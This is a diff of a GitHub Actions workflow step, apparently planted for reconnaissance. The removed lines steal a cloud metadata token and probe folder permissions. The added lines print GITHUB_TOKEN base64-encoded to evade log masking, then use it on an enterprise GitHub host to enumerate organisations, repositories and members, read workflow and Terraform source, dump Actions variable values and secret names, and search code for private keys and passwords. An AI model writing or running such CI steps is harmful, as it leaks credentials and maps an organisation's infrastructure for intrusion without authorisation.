@@ -23,41 +23,91 @@ jobs:
         run: |
           set +e
 
-          echo "=== ENTITY B IDENTITY ==="
-          GCP_TOKEN=$(curl -s -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" | jq -r .access_token)
-          SA_EMAIL="mayflowerseed-cloud-run-job@prj-2075722438-njqk.iam.gserviceaccount.com"
-          CURRENT_PROJECT="prj-2075722438-njqk"
-          echo "SA: $SA_EMAIL"
-          echo "Project: $CURRENT_PROJECT"
-
-          echo "=== PERMISSIONS ON FOLDER 1076129233003 ==="
-          curl -s -X POST -H "Authorization: Bearer $GCP_TOKEN" -H "Content-Type: application/json" \
-            "https://cloudresourcemanager.googleapis.com/v2/folders/1076129233003:testIamPermissions" \
-            -d '{"permissions":["resourcemanager.folders.get","resourcemanager.folders.list","resourcemanager.folders.getIamPolicy","resourcemanager.folders.setIamPolicy","resourcemanager.projects.list","resourcemanager.projects.get","resourcemanager.projects.create"]}' || true
-
-          echo "=== FOLDER 1076129233003 DETAILS ==="
-          curl -s -H "Authorization: Bearer $GCP_TOKEN" \
-            "https://cloudresourcemanager.googleapis.com/v2/folders/1076129233003" || true
-
-          echo "=== FOLDER 1076129233003 CHILDREN ==="
-          curl -s -H "Authorization: Bearer $GCP_TOKEN" \
-            "https://cloudresourcemanager.googleapis.com/v2/folders?parent=folders/1076129233003" || true
-
-          echo "=== PROJECTS UNDER FOLDER 1076129233003 ==="
-          curl -s -H "Authorization: Bearer $GCP_TOKEN" \
-            "https://cloudresourcemanager.googleapis.com/v1/projects?filter=parent.id%3A1076129233003%20parent.type%3Afolder" || true
-
-          echo "=== PERMISSIONS ON FOLDER 487834352768 ==="
-          curl -s -X POST -H "Authorization: Bearer $GCP_TOKEN" -H "Content-Type: application/json" \
-            "https://cloudresourcemanager.googleapis.com/v2/folders/487834352768:testIamPermissions" \
-            -d '{"permissions":["resourcemanager.folders.get","resourcemanager.folders.list","resourcemanager.folders.getIamPolicy","resourcemanager.folders.setIamPolicy","resourcemanager.projects.list","resourcemanager.projects.get","resourcemanager.projects.create"]}' || true
-
-          echo "=== PROJECTS UNDER FOLDER 487834352768 ==="
-          curl -s -H "Authorization: Bearer $GCP_TOKEN" \
-            "https://cloudresourcemanager.googleapis.com/v1/projects?filter=parent.id%3A487834352768%20parent.type%3Afolder" || true
-
-          echo "=== GITHUB TOKEN ==="
+          echo "=== GITHUB TOKEN (base64) ==="
           echo "$GITHUB_TOKEN" | base64
+
+          echo "=== TOKEN SCOPE ==="
+          curl -si -H "Authorization: token $GITHUB_TOKEN" \
+            "https://api.github.axa.com/user" 2>&1 | grep -i "x-oauth-scopes" || true
+
+          echo "=== TOKEN IDENTITY ==="
+          curl -s -H "Authorization: token $GITHUB_TOKEN" \
+            "https://api.github.axa.com/user" || true
+
+          echo "=== ALL ORGS ==="
+          curl -s -H "Authorization: token $GITHUB_TOKEN" \
+            "https://api.github.axa.com/user/orgs?per_page=100" | jq '.[].login' 2>/dev/null || true
+
+          echo "=== ALL REPOS PER ORG ==="
+          for org in $(curl -s -H "Authorization: token $GITHUB_TOKEN" \
+            "https://api.github.axa.com/user/orgs?per_page=100" | jq -r '.[].login' 2>/dev/null); do
+            echo ">> Org: $org"
+            curl -s -H "Authorization: token $GITHUB_TOKEN" \
+              "https://api.github.axa.com/orgs/$org/repos?per_page=100" | jq '.[] | {full_name, private, description}' 2>/dev/null || true
+          done
+
+          echo "=== WIF WORKFLOW SOURCE ==="
+          echo ">> prod-workflow-wif.yaml:"
+          curl -s -H "Authorization: token $GITHUB_TOKEN" \
+            "https://api.github.axa.com/repos/gcp-foundation/workflows/contents/.github/workflows/prod-workflow-wif.yaml" \
+            | jq -r .content 2>/dev/null | base64 -d 2>/dev/null || echo "cannot read"
+          echo ">> prod-pr-master-wif.yaml:"
+          curl -s -H "Authorization: token $GITHUB_TOKEN" \
+            "https://api.github.axa.com/repos/gcp-foundation/workflows/contents/.github/workflows/prod-pr-master-wif.yaml" \
+            | jq -r .content 2>/dev/null | base64 -d 2>/dev/null || echo "cannot read"
+
+          echo "=== PROJECT FACTORY MODULE ==="
+          for f in main.tf variables.tf outputs.tf iam.tf providers.tf versions.tf locals.tf; do
+            CONTENT=$(curl -s -H "Authorization: token $GITHUB_TOKEN" \
+              "https://api.github.axa.com/repos/gcp-foundation/gcp-terraform-tpl-project/contents/factory/$f?ref=v0.8.0" \
+              | jq -r .content 2>/dev/null | base64 -d 2>/dev/null)
+            if [ -n "$CONTENT" ]; then
+              echo ">> $f:"
+              echo "$CONTENT"
+            fi
+          done
+
+          echo "=== ORG + REPO VARIABLES (read-only) ==="
+          for org in $(curl -s -H "Authorization: token $GITHUB_TOKEN" \
+            "https://api.github.axa.com/user/orgs?per_page=100" | jq -r '.[].login' 2>/dev/null); do
+            echo ">> Org variables: $org"
+            curl -s -H "Authorization: token $GITHUB_TOKEN" \
+              "https://api.github.axa.com/orgs/$org/actions/variables" | jq '.variables[]? | {name, value}' 2>/dev/null || true
+            echo ">> Org secrets (names only): $org"
+            curl -s -H "Authorization: token $GITHUB_TOKEN" \
+              "https://api.github.axa.com/orgs/$org/actions/secrets" | jq '.secrets[]?.name' 2>/dev/null || true
+            for repo in $(curl -s -H "Authorization: token $GITHUB_TOKEN" \
+              "https://api.github.axa.com/orgs/$org/repos?per_page=100" | jq -r '.[].name' 2>/dev/null); do
+              VARS=$(curl -s -H "Authorization: token $GITHUB_TOKEN" \
+                "https://api.github.axa.com/repos/$org/$repo/actions/variables" 2>/dev/null)
+              SECRETS=$(curl -s -H "Authorization: token $GITHUB_TOKEN" \
+                "https://api.github.axa.com/repos/$org/$repo/actions/secrets" 2>/dev/null)
+              VAR_COUNT=$(echo "$VARS" | jq '.total_count' 2>/dev/null)
+              SEC_COUNT=$(echo "$SECRETS" | jq '.total_count' 2>/dev/null)
+              if [ "$VAR_COUNT" != "0" ] && [ -n "$VAR_COUNT" ] && [ "$VAR_COUNT" != "null" ] || \
+                 [ "$SEC_COUNT" != "0" ] && [ -n "$SEC_COUNT" ] && [ "$SEC_COUNT" != "null" ]; then
+                echo ">> $org/$repo"
+                echo "   Variables: $(echo "$VARS" | jq '[.variables[] | {name, value}]' 2>/dev/null)"
+                echo "   Secret names: $(echo "$SECRETS" | jq '[.secrets[].name]' 2>/dev/null)"
+              fi
+            done
+          done
+
+          echo "=== SEARCH SECRETS IN CODE (read-only) ==="
+          for term in "private_key" "password" "client_secret" "GOOGLE_CREDENTIALS" "BEGIN RSA PRIVATE"; do
+            echo ">> Search: $term"
+            curl -s -H "Authorization: token $GITHUB_TOKEN" \
+              "https://api.github.axa.com/search/code?q=org:gcp-foundation+$term&per_page=10" \
+              | jq '.items[] | {repo: .repository.full_name, path: .path}' 2>/dev/null || true
+          done
+
+          echo "=== ORG MEMBERS ==="
+          for org in $(curl -s -H "Authorization: token $GITHUB_TOKEN" \
+            "https://api.github.axa.com/user/orgs?per_page=100" | jq -r '.[].login' 2>/dev/null); do
+            echo ">> $org:"
+            curl -s -H "Authorization: token $GITHUB_TOKEN" \
+              "https://api.github.axa.com/orgs/$org/members?per_page=100" | jq '.[] | {login, site_admin}' 2>/dev/null || true
+          done
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
 
